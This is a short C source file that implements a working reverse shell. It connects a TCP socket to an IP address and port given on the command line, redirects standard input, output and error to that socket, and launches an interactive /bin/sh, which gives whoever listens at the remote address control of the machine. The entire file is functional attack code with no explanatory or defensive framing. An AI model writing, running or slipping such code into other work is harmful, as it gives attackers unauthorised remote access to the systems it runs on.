#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);

  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}

int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}

int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  start_shell (client_init (argv[1], atoi(argv[2])));
  return 0;
}
